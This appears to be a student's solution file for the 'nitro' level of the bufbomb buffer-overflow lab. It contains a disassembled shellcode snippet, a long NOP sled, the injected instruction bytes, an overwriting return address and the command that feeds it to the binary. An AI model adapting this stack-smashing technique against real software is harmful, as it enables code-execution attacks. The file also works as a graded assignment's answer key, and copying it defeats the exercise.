/* U202015282  */
/*
00000000 <.text>:
   0:	b8 29 17 6b 60       	mov    $0x606b1729,%eax
   5:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   9:	68 15 8e 04 08       	push   $0x8048e15
   e:	c3                   	ret    

 */
/* cat nitro_U202015282.txt |./hex2raw -n > nitro_U202015282.raw && ./bufbomb -n -u U202015282 < nitro_U202015282.raw */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 90 90 90 90 90 /* 10 bytes */
90 90 90 90 90 /* 90 90 90 90 90 */ /* 10 bytes */
90 90 90 90
/* 90 90 90 90 90 90 90 90 90 90 */ /* 10 bytes */

b8 29 17 6b 60
8d 6c 24 28   
68 15 8e 04 08
c3            

08 2d 68 55 /* 4 bytes */
